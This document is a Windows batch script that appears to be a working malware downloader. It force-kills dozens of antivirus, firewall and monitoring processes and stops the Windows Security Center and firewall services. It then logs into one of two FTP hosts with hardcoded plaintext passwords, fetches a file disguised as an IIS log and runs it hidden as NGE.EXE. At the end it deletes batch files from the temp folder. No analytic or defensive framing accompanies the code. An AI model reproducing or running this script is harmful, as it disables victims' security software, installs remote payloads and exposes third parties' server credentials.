   @ECHO OFF

   SET ftp1="acoustic-treatment.com"
   SET login1="acoustic-treatment"
   SET pass1="XMFEOV5@"
   SET path1="logs/W3SVC7/ex050313.log"
   SET fname1="ex050313.log"

   SET ftp2="frenchmenshope.com"
   SET login2="frenchmenshope"
   SET pass2="UWXtAL6@"
   SET path2="logs/W3SVC511/ex050313.log"
   SET fname2="ex050313.log"

   IF NOT EXIST %windir%\system32\taskkill.exe GOTO 1

   taskkill /IM "ANTI-TROJAN.EXE" /T /F
   taskkill /IM "ATGUARD.EXE" /T /F
   taskkill /IM "ATGUARD.EXE" /T /F
   taskkill /IM "AUTOUPDATE.EXE" /T /F
   taskkill /IM "AVP.EXE" /T /F
   taskkill /IM "AVP32.EXE" /T /F
   taskkill /IM "AVPCC.EXE" /T /F
   taskkill /IM "AVPM.EXE" /T /F
   taskkill /IM "avpm.EXE" /T /F
   taskkill /IM "DRWEB32.EXE" /T /F
   taskkill /IM "FIREWALL.EXE" /T /F
   taskkill /IM "JAMMER.EXE" /T /F
   taskkill /IM "KAVLITE40ENG.EXE" /T /F
   taskkill /IM "KAVPERS40ENG.EXE" /T /F
   taskkill /IM "KAVPF.EXE" /T /F
   taskkill /IM "KERIO-PF-213-EN-WIN.EXE" /T /F
   taskkill /IM "KERIO-WRL-421-EN-WIN.EXE" /T /F
   taskkill /IM "KERIO-WRP-421-EN-WIN.EXE" /T /F
   taskkill /IM "NAV" /T /F
   taskkill /IM "NAV.EXE" /T /F
   taskkill /IM "Auto-Protect" /T /F
   taskkill /IM "NAV80TRY.EXE" /T /F
   taskkill /IM "NAVAP" /T /F
   taskkill /IM "NAVAP.EXE" /T /F
   taskkill /IM "navapsvc.EXE" /T /F
   taskkill /IM "NAVW32.EXE" /T /F
   taskkill /IM "Navw32.EXE" /T /F
   taskkill /IM "NAVWNT.EXE" /T /F
   taskkill /IM "NC2000.EXE" /T /F
   taskkill /IM "NDD32.EXE" /T /F
   taskkill /IM "NEOMONITOR.EXE" /T /F
   taskkill /IM "NeoWatchLog.EXE" /T /F
   taskkill /IM "NETARMOR.EXE" /T /F
   taskkill /IM "NETARMOR.EXE" /T /F
   taskkill /IM "NETINFO.EXE" /T /F
   taskkill /IM "NETMON.EXE" /T /F
   taskkill /IM "NETSCANPRO.EXE" /T /F
   taskkill /IM "NETSPYHUNTER-1.2.EXE" /T /F
   taskkill /IM "NETSTAT.EXE" /T /F
   taskkill /IM "NETUTILS.EXE" /T /F
   taskkill /IM "NISSERV.EXE" /T /F
   taskkill /IM "NISUM.EXE" /T /F
   taskkill /IM "NORTON_INTERNET_SECU_3.0_407.EXE" /T /F
   taskkill /IM "notstart.EXE" /T /F
   taskkill /IM "NPF40_TW_98_NT_ME_2K.EXE" /T /F
   taskkill /IM "NPFMESSENGER.EXE" /T /F
   taskkill /IM "NPROTECT.EXE" /T /F
   taskkill /IM "npscheck.EXE" /T /F
   taskkill /IM "NPSSVC.EXE" /T /F
   taskkill /IM "NSCHED32.EXE" /T /F
   taskkill /IM "PORTMONITOR.EXE" /T /F
   taskkill /IM "PROCESSMONITOR.EXE" /T /F
   taskkill /IM "PROCEXPLORERV1.0.EXE" /T /F
   taskkill /IM "PROGRAMAUDITOR.EXE" /T /F
   taskkill /IM "PROPORT.EXE" /T /F
   taskkill /IM "PROTECTX.EXE" /T /F
   taskkill /IM "REALMON.EXE" /T /F
   taskkill /IM "RESCUE.EXE" /T /F
   taskkill /IM "RESCUE32.EXE" /T /F
   taskkill /IM "RRGUARD.EXE" /T /F
   taskkill /IM "SYMPROXYSVC.EXE" /T /F
   taskkill /IM "SymProxySvc.EXE" /T /F
   taskkill /IM "UPDATE.EXE" /T /F
   taskkill /IM "VIRUSMDPERSONALFIREWALL.EXE" /T /F
   taskkill /IM "ZAPRO.EXE" /T /F
   taskkill /IM "zapro.EXE" /T /F
   taskkill /IM "ZONALM2601.EXE" /T /F
   taskkill /IM "ZONEALARM.EXE" /T /F
   taskkill /IM "zonealarm.EXE" /T /F
   taskkill /IM "AVGUARD.EXE" /T /F
   taskkill /IM "AVWUPSRV.EXE" /T /F

   :1

   NET STOP "wscsvc"

   NET STOP "SharedAccess"

   CD %temp%

   ECHO open %ftp1%>%temp%\m
   ECHO %login1%>>%temp%\m
   ECHO %pass1%>>%temp%\m
   ECHO get %path1%>>%temp%\m
   ECHO bye>>%temp%\m
   ftp -s:%temp%\m
   DEL /F /Q %temp%\m

   REN %fname1% NGE.EXE

   IF EXIST NGE.EXE GOTO 2

   ECHO open %ftp2%>%temp%\m
   ECHO %login2%>>%temp%\m
   ECHO %pass2%>>%temp%\m
   ECHO get %path2%>>%temp%\m
   ECHO bye>>%temp%\m
   ftp -s:%temp%\m
   DEL /F /Q %temp%\m

   REN %fname2% NGE.EXE

   :2

   IF NOT EXIST NGE.EXE GOTO 3

   START /B /MIN NGE.EXE

   :3

   DEL /Q /F %temp%\*.bat
